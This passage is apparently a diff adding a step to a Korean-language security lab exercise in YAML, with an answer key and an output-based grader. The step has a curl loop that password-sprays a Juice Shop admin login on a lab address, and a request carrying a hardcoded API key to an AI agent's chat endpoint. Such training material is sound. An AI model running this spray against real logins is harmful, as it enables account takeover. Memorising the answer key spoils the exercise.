@@ -375,3 +375,40 @@ steps:
           - "**[OSS] LangChain 의 Constitutional AI**"
           - "**[OSS] AWS Bedrock Guardrails 의 managed service**"
     target_vm: attacker
+
+  # ============================================================
+  # STEP 6 — R/B/P 종합 (AI 에이전트 의 base)
+  # ============================================================
+  - order: 6
+    instruction: |
+      ## 🎯 MISSION (R/B/P 종합) — Bastion ReAct 의 1 cycle
+
+      Red = credential spray + chat 요청 / Blue = Suricata/ModSec/Wazuh 의 alert /
+      Purple = Bastion 의 ReAct 응답 (운영자 chat).
+
+      ## 💻
+      ```bash
+      ssh 6v6-attacker 'for p in 123 admin password; do curl -s -o /dev/null -w "%{http_code}\n" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$p\"}" -H "Content-Type: application/json" -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/login; done'
+      ssh 6v6-bastion 'curl -s -X POST http://192.168.0.103:8003/chat -H "X-API-Key: ccc-api-key-2026" -H "Content-Type: application/json" -d "{\"text\":\"방금 credential spray 의 alert 분석\"}" | jq -r ".response" 2>/dev/null | head -5'
+      echo "Coverage: Red attack → Blue alert → Purple Bastion ReAct 의 1 cycle"
+      ```
+
+      ## 💡 왜
+      AI 에이전트 의 R/B/P 의 base. Purple = Bastion 의 자동 응답.
+    hint: 'curl spray + Bastion /chat 의 분석 요청'
+    category: rbp_integration
+    points: 4
+    answer: |
+      ssh 6v6-attacker 'for p in 123 admin; do curl -s -o /dev/null -w "%{http_code}\n" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$p\"}" -H "Content-Type: application/json" -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/login; done'
+      ssh 6v6-bastion 'curl -s -X POST http://192.168.0.103:8003/chat -H "X-API-Key: ccc-api-key-2026" -H "Content-Type: application/json" -d "{\"text\":\"credential spray alert\"}" 2>&1 | head -5'
+      echo "Coverage: Red→Blue→Purple Bastion ReAct"
+    answer_detail: AI 에이전트 R/B/P 1 cycle
+    verify:
+      type: output_contains
+      expect: 'Coverage'
+      field: stdout
+      semantic:
+        intent: AI 에이전트 R/B/P
+        success_criteria: [credential spray, Bastion chat, Coverage]
+        acceptable_methods: ["**[OSS] curl + Bastion /chat**"]
+    target_vm: bastion
